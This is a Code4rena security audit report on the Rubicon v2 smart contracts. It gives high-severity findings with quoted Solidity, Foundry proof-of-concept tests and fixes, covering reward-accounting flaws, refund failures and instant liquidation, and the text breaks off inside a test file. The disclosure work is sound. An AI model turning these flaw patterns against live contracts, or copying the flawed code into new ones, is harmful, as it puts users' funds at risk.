---
sponsor: "Rubicon"
slug: "2023-04-rubicon"
date: "2025-02-17"
title: "Rubicon v2"
findings: "https://github.com/code-423n4/2023-04-rubicon-findings/issues"
contest: 229
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Rubicon v2 smart contract system written in Solidity. The audit took place between April 5 — April 13 2023.

## Wardens

194 Wardens contributed reports to the Rubicon v2:

  1. [0Kage](https://twitter.com/0kage_eth)
  2. 0x3b
  3. [0x6980](https://twitter.com/0x6980)
  4. [0xAgro](https://twitter.com/0xAgro)
  5. [0xBeirao](https://twitter.com/0xBeirao)
  6. [0xDING99YA](https://twitter.com/ding99ya)
  7. 0xNineDec
  8. 0xPiercer
  9. [0xPkhatri](https://twitter.com/0xPkhatri)
  10. [0xSmartContract](https://twitter.com/0xSmartContract)
  11. [0xStalin](https://twitter.com/Stalin_eth)
  12. [0xTheC0der](https://twitter.com/MarioPoneder)
  13. 0xWaitress
  14. [0xfusion](https://twitter.com/sstrenev)
  15. 0xhacksmithh
  16. 0xkazim
  17. 0xmichalis
  18. [0xnacho](https://twitter.com/0xnacho17)
  19. [0xnev](https://twitter.com/0xnevi)
  20. 117l11
  21. [33audits](https://twitter.com/llbreaksthings)
  22. [3agle](https://twitter.com/0x34gle)
  23. Ace-30
  24. AlexCzm
  25. [Arz](https://twitter.com/arzdev)
  26. [Aymen0909](https://github.com/Aymen1001)
  27. BGSecurity ([anonresercher](https://twitter.com/anonresercher) and [martin](https://github.com/martin-petrov03))
  28. Banditx0x
  29. Bauer
  30. Breeje
  31. [CRYP70](https://twitter.com/CRYP70_)
  32. [CodeFoxInc](https://twitter.com/CodeFoxInc) ([thurendous](https://twitter.com/Markwu_crypto), TerrierLover and retocrooman)
  33. CryptoCraze (jekapi, [Yarpo](https://www.linkedin.com/in/yardenporat1/), [0xDACA](https://twitter.com/0xDACA) and tash)
  34. [DedOhWale](https://twitter.com/dedohwale)
  35. Delvir0
  36. DijkstraDev
  37. Dug
  38. [ElKu](https://twitter.com/ElKu_crypto)
  39. [Emmanuel](https://twitter.com/emeduduna)
  40. Evo
  41. Fanz
  42. [Ignite](https://twitter.com/IgniteLikeAFire)
  43. [Inspex](https://twitter.com/InspexCo) (Resistor, jokopoppo, DeStinE21, mimic_f, Rugsurely, ErbaZZ and rxnnxchxi)
  44. J4de
  45. [JC](https://twitter.com/sm4rtcontr4ct)
  46. [JCN](https://twitter.com/0xJCN)
  47. Jigsaw
  48. John
  49. Josiah
  50. [Juntao](https://twitter.com/0xJuntao)
  51. [Kaysoft](https://www.linkedin.com/in/kayode-okunlade-862001142/)
  52. KingNFT
  53. LaScaloneta ([nicobevi](https://github.com/nicobevilacqua), [juancito](https://twitter.com/0xJuancito) and 0x4non)
  54. [Lilyjjo](https://twitter.com/LobsterMindset)
  55. Lirios
  56. Madalad
  57. MalfurionWhitehat
  58. [MatricksDeCoder](https://twitter.com/Zed_Blockchain)
  59. [McToady](mctoady.dev)
  60. MohammedRizwan
  61. Neon2835
  62. [Nyx](https://twitter.com/Nyksx__)
  63. [Ocean\_Sky](https://twitter.com/bluenights004)
  64. [PierrickGT](https://twitter.com/PierrickGT)
  65. [Qeew](https://twitter.com/adigunq_adigun)
  66. R2
  67. Rageur
  68. Raihan
  69. RaymondFam
  70. RedTiger
  71. ReyAdmirado
  72. [Rolezn](https://twitter.com/Rolezn)
  73. [Ruhum](https://twitter.com/0xruhum)
  74. SAAJ
  75. SaeedAlipoor01988
  76. [Sathish9098](https://www.linkedin.com/in/sathishkumar-p-26069915a)
  77. [Shubham](https://twitter.com/Shaping_Myself)
  78. SleepingShell
  79. SpicyMeatball
  80. T1MOH
  81. [Toshii](https://twitter.com/0xToshii)
  82. Tricko
  83. [Udsen](https://github.com/udsene)
  84. VAD37
  85. Viktor\_Cortess
  86. Walter
  87. \_\_141345\_\_
  88. [adriro](https://twitter.com/adrianromero)
  89. alexzoid
  90. anodaram
  91. ast3ros
  92. atharvasama
  93. [azhar](https://twitter.com/azhar0406)
  94. bearonbike
  95. [bin2chen](https://twitter.com/bin2chen)
  96. brgltd
  97. btk
  98. [bytes032](https://twitter.com/bytes032)
  99. [c3phas](https://twitter.com/c3ph_)
  100. [carlitox477](https://twitter.com/carlitox477)
  101. carrotsmuggler
  102. [catellatech](https://twitter.com/CatellaTech)
  103. caventa
  104. cccz
  105. cducrest
  106. chaduke
  107. [ckksec](https://twitter.com/ckksec)
  108. cloudjunky
  109. [dacian](https://twitter.com/DevDacian)
  110. [darksnow](https://twitter.com/fedebianu)
  111. ddimitrov22
  112. dec3ntraliz3d
  113. descharre
  114. [dharma09](https://twitter.com/im_Dharma09)
  115. dontonka
  116. [favelanky](https://twitter.com/favelanky)
  117. fs0c
  118. fyvgsk
  119. ginlee
  120. halden
  121. [hunter\_w3b](https://twitter.com/hunt3r_w3b)
  122. iliyaniliev
  123. immeas
  124. jangle
  125. jasonxiale
  126. [joestakey](https://twitter.com/JoeStakey)
  127. [juancito](https://twitter.com/0xJuancito)
  128. [kaden](https://twitter.com/0xKaden)
  129. karanctf
  130. koxuan
  131. ktg
  132. kutugu
  133. [ladboy233](https://twitter.com/Xc1008Cui)
  134. ljmanini
  135. lopotras
  136. luciana
  137. lukris02
  138. markus\_ether
  139. matrix\_0wl
  140. [minhtrng](https://twitter.com/0xMinhT)
  141. mjmoonwalker
  142. [mrpathfindr](https://twitter.com/0xpathfindr)
  143. [nirlin](https://twitter.com/0xnirlin)
  144. [nobody2018](https://twitter.com/nobody20185)
  145. [orion](https://twitter.com/Zcropakx)
  146. oualidpro
  147. parlayan_yildizlar_takimi ([ulas](https://twitter.com/_ulasanil), caglankaan and ata)
  148. parsely
  149. [pavankv](https://twitter.com/@PavanKumarKv2)
  150. [peakbolt](https://twitter.com/peak_bolt)
  151. peanuts
  152. pipoca
  153. pixpi
  154. popular00
  155. qbs
  156. qpzm
  157. ravikiranweb3
  158. rbserver
  159. ro1sharkm
  160. rvierdiiev
  161. said
  162. [saneryee](https://medium.com/@saneryee-studio)
  163. sashik\_eth
  164. [sayan](https://twitter.com/sayan_011)
  165. sces60107
  166. shalaamum
  167. [sinarette](twitter.com/noots0)
  168. tallo
  169. [teddav](https://twitter.com/0xteddav)
  170. thekmj
  171. tnevler
  172. top1st
  173. [volodya](https://twitter.com/0xVolodya)
  174. [whoismatthewmc1](https://twitter.com/whoismatthewmc1)
  175. xmxanuel
  176. yellowBirdy
  177. [zaevlad](https://zaevlad.com/)
  178. zhuXKET

This audit was judged by [hickuphh3](https://github.com/HickupHH3).

Final report assembled by thebrittfactor.

# Summary

The C4 analysis yielded an aggregated total of 45 unique vulnerabilities. Of these vulnerabilities, 17 received a risk rating in the category of HIGH severity and 28 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 29 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 29 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Rubicon v2 repository](https://github.com/code-423n4/2023-04-rubicon), and is composed of 6 smart contracts written in the Solidity programming language and includes 1577 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (17)
## [[H-01] `RubiconMarket._buys` will not work for V1 offers due to the reversion in `cancel` method.](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1324)
*Submitted by [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1324), also found by [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1281), [cducrest](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1195) and [bin2chen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/866)*.

`RubiconMarket._buys` tries to cancel dust remaining offers, but it fails for V1 offers. So it blocks `RubiconMarket._buys`.

### Proof of Concept

In `RubiconMarket._buys`, it tries to cancel an offer with dust pay token amount after fulfilling. So it sets `dustId` so it can pass the `RubiconMarket.can_cancel` modifier.

```solidity
        if (
            isActive(id) &&
            offers[id].pay_amt < _dust[address(offers[id].pay_gem)]
        ) {
            dustId = id; //enable current msg.sender to call cancel(id)
            cancel(id);
        }
```

But when we move into the `cancel` method, there is another validation. `RubiconMarket.cancel` will call `SimpleMarket.cancel`, and `SimpleMarket.cancel` tries to return dust pay token amount to owner.

```solidity
        _offer.owner == address(0) && msg.sender == _offer.recipient
            ? require(_offer.pay_gem.transfer(_offer.recipient, _offer.pay_amt))
            : require(_offer.pay_gem.transfer(_offer.owner, _offer.pay_amt));
```

In this case, `msg.sender` is different from `_offer.recipient`, so `SimpleMarket.cancel` will treat this as a V2 offer, while it can be a valid V1 offer. So for a V1 offer, it tries to send pay token amount to `_offer.owner` when it is `address(0)` for V1 offers. So it will revert and `SimpleMarket.cancel` will not work, although it passes `RubiconMarket.can_cancel` modifier. This will block the `_buy` method.

### Recommended Mitigation Steps

In `SimpleMarket.cancel`, we should refund pay token amount to `_offer.recipient` when `_offer.owner` is `address(0)`.

**[daoio (Rubicon) disagreed with severity and confirmed via duplicate issue #1281](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1281#issuecomment-1532541827)**

**[HickupHH3 (judge) commented via duplicate issue #1281](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1281#issuecomment-1577861311):**
>I'm selecting [#1324](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1324) for the report instead because OZ's. ERC20 implementation blocks transfers to the null address, so in most cases, [cancellation will revert](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L219) as opposed to lost funds.

***

## [[H-02] `FeeWrapper` fails to handle ETH payment refunds](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1301)
*Submitted by [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1301), also found by [parsely](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1288), [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1283), [VAD37](https://github.com/code-423n4/2023-04-rubicon-findings/issues/947) and [fyvgsk](https://github.com/code-423n4/2023-04-rubicon-findings/issues/173)*.

The `FeeWrapper` contract can be used to wrap calls that include ETH payments. This is handled by the `_rubicallPayable` function:

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89>

```solidity
76:     function _rubicallPayable(
77:         CallParams memory _params
78:     ) internal returns (bytes memory) {
79:         // charge fee from feeParams
80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);
81: 
82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(
83:             bytes.concat(_params.selector, _params.args)
84:         );
85: 
86:         require(_OK, "low-level call to the router failed");
87: 
88:         return _data;
89:     }
```

As we can see in the previous snippet, the implementation will forward the ETH payment (minus fees) to the target contract. If the target contract ends up using less ETH than the sent amount, then the usual approach would be to refund the remaining ETH back to the caller, which is a normal and common operation.

If this is the case, then the wrapped call will fail as the `FeeWrapper` doesn't implement the `receive` or `fallback` function to allow ETH payments. Even though there is no loss of funds as the transaction is reverted, the issue will prevent users from wrapping calls to target contracts that may refund ETH as part of their normal behavior.

As a potential real example, we can the explore the `buyAllAmountWithETH` function present in the `RubiconRouter` contract:

<https://github.com/RubiconDeFi/rubi-protocol-v2/blob/master/contracts/utilities/RubiconRouter.sol#L379-L418>

```solidity
379:     function buyAllAmountWithETH(
380:         ERC20 buy_gem,
381:         uint256 buy_amt,
382:         uint256 max_fill_amount
383:     ) external payable beGoneReentrantScum returns (uint256 fill) {
384:         address _weth = address(wethAddress);
385:         uint256 _before = ERC20(_weth).balanceOf(address(this));
386:         require(
387:             msg.value == max_fill_amount,
388:             "must send as much ETH as max_fill_amount"
389:         );
390:         IWETH(wethAddress).deposit{value: max_fill_amount}(); // Pay with native ETH -> WETH
391: 
392:         if (
393:             IWETH(wethAddress).allowance(address(this), RubiconMarketAddress) <
394:             max_fill_amount
395:         ) {
396:             approveAssetOnMarket(wethAddress);
397:         }
398: 
399:         // An amount in WETH
400:         fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(
401:             buy_gem,
402:             buy_amt,
403:             ERC20(wethAddress),
404:             max_fill_amount
405:         );
406:         IERC20(buy_gem).safeTransfer(msg.sender, fill);
407: 
408:         uint256 _after = ERC20(_weth).balanceOf(address(this));
409:         uint256 delta = _after - _before;
410: 
411:         // Return unspent coins to sender
412:         if (delta > 0) {
413:             IWETH(wethAddress).withdraw(delta);
414:             // msg.sender.transfer(delta);
415:             (bool success, ) = msg.sender.call{value: delta}("");
416:             require(success, "Transfer failed.");
417:         }
418:     }
```

As we can see in the previous snippet, the function will potentially refund the caller the unspent ETH in lines 412-417. If this call is being wrapped using the `FeeWrapper`, then `msg.sender` will be the `FeeWrapper` contract.

### Proof of Concept

In the following test, we create a demonstration contract `FeeWrapperTarget` which includes a function named `demoETH` that will refund half of the sent amount back to the caller. The wrapped call will fail, as the `FeeWrapperTarget` will try to refund the ETH to the `FeeWrapper` contract which doesn't allow ETH payments, causing the whole transaction to be reverted.

*Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).*

```solidity
function test_FeeWrapper_FailsWithETHRefund() public {
    FeeWrapperTarget target = new FeeWrapperTarget(ERC20(address(0)));

    uint256 amount = 1 ether;
    uint256 fee = 0.1 ether;

    vm.deal(alice, amount + fee);

    // Alice will call demoERC20
    vm.startPrank(alice);

    FeeWrapper.CallParams memory callParams;
    callParams.selector = FeeWrapperTarget.demoETH.selector;
    callParams.args = "";
    callParams.target = address(target);
    callParams.feeParams.feeToken = address(0);
    callParams.feeParams.totalAmount = amount + fee;
    callParams.feeParams.feeAmount = fee;
    callParams.feeParams.feeTo = makeAddr("FeeRecipient");

    // The following call will fail, the FeeWrapper contract is not prepared to receive the ETH from the target contract
    vm.expectRevert("low-level call to the router failed");
    feeWrapper.rubicall{value: amount + fee}(callParams);

    vm.stopPrank();
}
```

### Recommendation

Allow the `FeeWrapper` contract to receive ETH by implementing the `receive` function. After the call to the target contract, refund any ETH amount present in the `FeeWrapper` contract back to the original caller.

**[daoio (Rubicon) confirmed via duplicate issue #1283](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1283#issuecomment-1532512194)**

**[HickupHH3 (judge) increased severity to High and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1301#issuecomment-1578016433):**
 > Core issue is that the `FeeWrapper` lacks functionality to handle refunds in general, whether in ETH or ERC20. Specifically, for ETH, lacking `receive()` / `fallback()` functions to accept inbound transfers.
> 
> Generally, I would've considered this to be Medium severity because it's conditional on the target contract sending back funds. However, the `FeeWrapper` is expected to interact with the Rubicon contracts, which the warden has shown to have the ability send back funds. Hence, the High severity is justified.

***

## [[H-03] Reward accounting is incorrect in `BathBuddy` contract](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1279)
*Submitted by [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1279), also found by [R2](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1350), [cducrest](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1342), [zhuXKET](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1313), [dec3ntraliz3d](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1267), [0xTheC0der](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1265), [AlexCzm](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1254), [markus\_ether](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1237), [0xTheC0der](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1214), [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1198), [teddav](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1176), [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1175), [kutugu](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1173), [nirlin](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1168), [joestakey](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1153), [kaden](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1123), [John](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1094), [nirlin](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1074), [Emmanuel](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1068), [0Kage](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1045), [shalaamum](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1035), [Toshii](https://github.com/code-423n4/2023-04-rubicon-findings/issues/971), [Delvir0](https://github.com/code-423n4/2023-04-rubicon-findings/issues/901), [rbserver](https://github.com/code-423n4/2023-04-rubicon-findings/issues/896), [\_\_141345\_\_](https://github.com/code-423n4/2023-04-rubicon-findings/issues/882), [\_\_141345\_\_](https://github.com/code-423n4/2023-04-rubicon-findings/issues/881), [0xDING99YA](https://github.com/code-423n4/2023-04-rubicon-findings/issues/852), [0xDING99YA](https://github.com/code-423n4/2023-04-rubicon-findings/issues/849), [ast3ros](https://github.com/code-423n4/2023-04-rubicon-findings/issues/824), [Lirios](https://github.com/code-423n4/2023-04-rubicon-findings/issues/781), [sces60107](https://github.com/code-423n4/2023-04-rubicon-findings/issues/765), [jasonxiale](https://github.com/code-423n4/2023-04-rubicon-findings/issues/755), [mrpathfindr](https://github.com/code-423n4/2023-04-rubicon-findings/issues/706), [SaeedAlipoor01988](https://github.com/code-423n4/2023-04-rubicon-findings/issues/692), [KingNFT](https://github.com/code-423n4/2023-04-rubicon-findings/issues/684), [Ace-30](https://github.com/code-423n4/2023-04-rubicon-findings/issues/680), [sinarette](https://github.com/code-423n4/2023-04-rubicon-findings/issues/676), [carrotsmuggler](https://github.com/code-423n4/2023-04-rubicon-findings/issues/627), [carrotsmuggler](https://github.com/code-423n4/2023-04-rubicon-findings/issues/626), [Lilyjjo](https://github.com/code-423n4/2023-04-rubicon-findings/issues/623), [Lilyjjo](https://github.com/code-423n4/2023-04-rubicon-findings/issues/622), [lopotras](https://github.com/code-423n4/2023-04-rubicon-findings/issues/611), [ktg](https://github.com/code-423n4/2023-04-rubicon-findings/issues/605), [Banditx0x](https://github.com/code-423n4/2023-04-rubicon-findings/issues/549), [yellowBirdy](https://github.com/code-423n4/2023-04-rubicon-findings/issues/506), [dontonka](https://github.com/code-423n4/2023-04-rubicon-findings/issues/477), [RedTiger](https://github.com/code-423n4/2023-04-rubicon-findings/issues/443), [Banditx0x](https://github.com/code-423n4/2023-04-rubicon-findings/issues/430), [bytes032](https://github.com/code-423n4/2023-04-rubicon-findings/issues/391), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/389), [bytes032](https://github.com/code-423n4/2023-04-rubicon-findings/issues/387), [mjmoonwalker](https://github.com/code-423n4/2023-04-rubicon-findings/issues/384), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/382), [chaduke](https://github.com/code-423n4/2023-04-rubicon-findings/issues/380), [SpicyMeatball](https://github.com/code-423n4/2023-04-rubicon-findings/issues/305), [bytes032](https://github.com/code-423n4/2023-04-rubicon-findings/issues/301), [nobody2018](https://github.com/code-423n4/2023-04-rubicon-findings/issues/294), [T1MOH](https://github.com/code-423n4/2023-04-rubicon-findings/issues/287), [Juntao](https://github.com/code-423n4/2023-04-rubicon-findings/issues/272), [0xStalin](https://github.com/code-423n4/2023-04-rubicon-findings/issues/253), [J4de](https://github.com/code-423n4/2023-04-rubicon-findings/issues/231), [Dug](https://github.com/code-423n4/2023-04-rubicon-findings/issues/226), [ljmanini](https://github.com/code-423n4/2023-04-rubicon-findings/issues/204), [0xmichalis](https://github.com/code-423n4/2023-04-rubicon-findings/issues/164), [rvierdiiev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/103), [Fanz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/90), [rvierdiiev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/34) and [117l11](https://github.com/code-423n4/2023-04-rubicon-findings/issues/27)*.

The `BathBuddy` contracts implements rewards for liquidity providers (holders of `BathToken`). The contract is modeled after the famous Synthetix staking contract, with some tweaks to support rewards for multiple tokens at the same time.

The implementation overall is correct; however, there is a critical difference with the Synthetix contract that is ignored in the `BathBuddy` contract. In the Synthetix implementation, the main actions related to rewards accounting are the `stake` and `withdraw` actions. These trigger the `updateReward` modifier to ensure correct reward accounting. Staked tokens cannot be transferred, as these are held in the staking contract. In the `BathBuddy` implementation, things are very different as there is no staking. Rewards are intended to be distributed directly to holders of the `BathToken` without any need of staking the tokens in the contract. This means that, as there is no "staking" action in the `BathBuddy` implementation (i.e. depositing funds in the contract), rewards fail to be correctly accounted whenever   `BathToken` are minted, burned or transferred between different accounts.

These are two critical places in the code where the `BathBuddy` contract uses the state from the `BathToken`, but fails to be triggered whenever the state in the `BathToken` is modified. The first is `rewardPerToken`, which calculates the amount of rewards that should correspond to one unit of the `BathToken` token. This is logically dependent on the total supply of the token (lines 124 and 133):

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L121-L135>

```solidity
121:     function rewardPerToken(address token) public view returns (uint256) {
122:         require(friendshipStarted, "I have not started a bathToken friendship");
123: 
124:         if (IERC20(myBathTokenBuddy).totalSupply() == 0) {
125:             return rewardsPerTokensStored[token];
126:         }
127:         return
128:             rewardsPerTokensStored[token].add(
129:                 lastTimeRewardApplicable(token)
130:                     .sub(lastUpdateTime[token])
131:                     .mul(rewardRates[token])
132:                     .mul(1e18)
133:                     .div(IERC20(myBathTokenBuddy).totalSupply())
134:             );
135:     }
```

The other place is in the `earned` function which uses the `BathToken` `balanceOf` function of an account (lines 146-147):

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L139-L161>

```solidity
139:     function earned(
140:         address account,
141:         address token
142:     ) public view override returns (uint256) {
143:         require(friendshipStarted, "I have not started a bathToken friendship");
144: 
145:         return
146:             IERC20(myBathTokenBuddy) // Care with this?
147:                 .balanceOf(account)
148:                 .mul(
149:                     rewardPerToken(token).sub(
150:                         userRewardsPerTokenPaid[token][account]
151:                     )
152:                 )
153:                 .div(1e18)
154:                 .add(tokenRewards[token][account]);
155:     }
156: 
157:     function getRewardForDuration(
158:         address token
159:     ) external view returns (uint256) {
160:         return rewardRates[token].mul(rewardsDuration[token]);
161:     }
```

Since the whole `BathBuddy` contract is dependent on the total supply and account balance state of the paired `BathToken` contract, the following actions in the token should update the rewards state in `BathBuddy`:

*   `mint` and `burn`, as these modify the total supply of the token and the balances of the account whose tokens are minted or burned.
*   `transfer` and `transferFrom`, as these modify the balances of the sender and recipient accounts.

As the `BathBuddy` `updateReward` modifier fails to be triggered when the mentioned state in the `BathToken` is modified, reward accounting will be incorrect for many different scenarios. We'll explore one of these in the next section.

### Proof of Concept

In the following test, we demonstrate one of the possible scenarios where reward accounting is broken. This is a simple case in which rewards fail to be updated when a token transfer is executed. Alice has 1e18 `BathTokens`, at the middle of the rewards duration period she sends all her tokens to Bob. The expected outcome should be that Alice would earn half of the rewards, as she held the tokens for the half of the duration period. But when the duration period has ended, we call `getReward` for both Alice and Bob and we can see that Alice got nothing and Bob earned 100% of the rewards.

*Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).*

```solidity
function test_BathBuddy_IncorrectRewardAccounting() public {
    // Setup rewards
    uint256 startTime = block.timestamp;
    uint256 duration = 10_000 seconds;
    vm.prank(bathBuddyOwner);
    bathBuddy.setRewardsDuration(duration, address(rewardToken));

    uint256 rewardAmount = 100 ether;
    rewardToken.mint(address(bathBuddy), rewardAmount);
    vm.prank(bathBuddyOwner);
    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);

    // Mint bathTokens to Alice
    uint256 bathTokenAmount = 1 ether;
    bathToken.mint(alice, bathTokenAmount);

    // Simulate half of the duration time passes
    vm.warp(startTime + duration / 2);

    // Alice transfers tokens for Bob at middle of the period
    vm.prank(alice);
    bathToken.transfer(bob, bathTokenAmount);

    // Simulate complete duration time passes
    vm.warp(startTime + duration);

    // Trigger getRewards for Alice
    vm.prank(bathBuddyHouse);
    bathBuddy.getReward(rewardToken, alice);

    // Trigger getRewards for Bob
    vm.prank(bathBuddyHouse);
    bathBuddy.getReward(rewardToken, bob);

    // Alice gets nothings and Bob gets the full rewards, even though Alice held the tokens for half the duration time
    assertEq(rewardToken.balanceOf(alice), 0);
    assertEq(rewardToken.balanceOf(bob), rewardAmount);
}
```

### Recommendation

There are two recommended paths here. The easy path would be to just add the `stake` and `withdraw` functions to the `BathBuddy` contract similar to how the original `StakingRewards` contract works on Synthetix. However, this may change the original intention of the protocol as rewards won't be earned just by holding `BathTokens`, they will need to be staked (rewards will only be distributed to stakers).

The other path, and a bit more complex, would be to modify the `BathToken` contract (the `cToken`) so that burn, mint and transfer actions trigger the update on the paired `BathBuddy` contract.

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1279#issuecomment-1532544961)**

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1279#issuecomment-1578131592):**
 > This write-up encapsulates the issues arising from forking the staking contract, but doing away with the staking portion through the usage of `balanceOf()` and `totalSupply()`.
> - No initialisation of `userRewardsPerTokenPaid`
> - Doesn't account for holding duration 

**[0xepley (warden) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1279#issuecomment-1590923406):**
 > I think that in the duplicate, two categories of issues have been merged into one.
> 
> So the two separate problems that have been merged into one are:
> 
> 1. Difference of implementation from synthetix, where there is no modifier on stake and withdraw. Hence, the calculation is flawed, leading to being able to claim the reward for whole duration by minting at the last moment, reducing others' rewards.
> 
> 2. Second, is the ability to transfer the token and claim (again and again, etc) until the contract is drained.
> 
> Both are different issues and require different solutions.
> 
> Just for example, two marked duplicates are: [#1074](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1074) and [#1168](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1168). Each explain separate issues of uneven distribution and draining.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1279#issuecomment-1590933212):**
 > (2) is enabled by (1). 
> 
> The removal of staking & withdrawing (1) also led to the removal of initialisation of the `rewardsPerToken`, which allows you to do (2).

***

## [[H-04] Some positions will get liquidated immediately](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1180)
*Submitted by [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1180), also found by [0xBeirao](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1362), [kaden](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1132), [ast3ros](https://github.com/code-423n4/2023-04-rubicon-findings/issues/827), [cccz](https://github.com/code-423n4/2023-04-rubicon-findings/issues/417) and [ladboy233](https://github.com/code-423n4/2023-04-rubicon-findings/issues/315)*.

When opening a position, the user makes a deposit and takes a loan against this on the Rubicon compound fork. This loan is taken using max liquidity:
<br><https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319>

```solidity
File: utilities/poolsUtility/Position.sol

306:    function _maxBorrow(
307:        address _bathToken
308:    ) internal view returns (uint256 _max) {
309:        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller
310:            .getAccountLiquidity(address(this));
311:
312:        require(_err == 0, "_maxBorrow: ERROR");
313:        require(_liq > 0, "_maxBorrow: LIQUIDITY == 0");
314:        require(_shortfall == 0, "_maxBorrow: SHORTFALL != 0");
315:
316:        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));
317:        _max = (_liq.mul(10 ** 18)).div(_price);
318:        require(_max > 0, "_maxBorrow: can't borrow 0");
319:    }
```

The danger here, is the interest rate for a loan needs to be higher than the interest for the deposit of the collateral. Hence, the block after the loan is taken it will be under water.

Positions opened will, in the block after they are created, become under water and be possible to liquidate.

This only impacts a certain set of leverages (shorts 1x, longs 1.7x and so on) where you loan up to your collateral max; hence, medium severity.

A user will have to know about this behavior in `Position` and in the same tx (to be safe) increase their margin to not be vulnerable to liquidation.

### Proof of Concept

PoC test, `PositionTest.t.sol`:

    pragma solidity ^0.8.0;

    import "../../contracts/compound-v2-fork/WhitePaperInterestRateModel.sol";
    import "../../contracts/compound-v2-fork/CErc20Delegate.sol";
    import "../../contracts/compound-v2-fork/CErc20.sol";
    import "../../contracts/compound-v2-fork/Comptroller.sol";
    import "../../contracts/compound-v2-fork/CToken.sol";
    import "../../contracts/periphery/TokenWithFaucet.sol";
    import "../../contracts/periphery/DummyPriceOracle.sol";
    import "../../contracts/RubiconMarket.sol";
    import "../../contracts/BathHouseV2.sol";
    import "../../contracts/utilities/poolsUtility/Position.sol";
    import "../../contracts/utilities/poolsUtility/PoolsUtility.sol";

    import "forge-std/Test.sol";

    contract PositionTest is Test {
      //========================CONSTANTS========================
      address public owner;
      address FEE_TO = 0x0000000000000000000000000000000000000FEE;
      // core contracts
      RubiconMarket market;
      Comptroller comptroller;
      BathHouseV2 bathHouse;

      DummyPriceOracle oracle;

      // test tokens
      TokenWithFaucet TEST;
      TokenWithFaucet TUSDC;

      CErc20 cTEST;
      CErc20 cTUSDC;

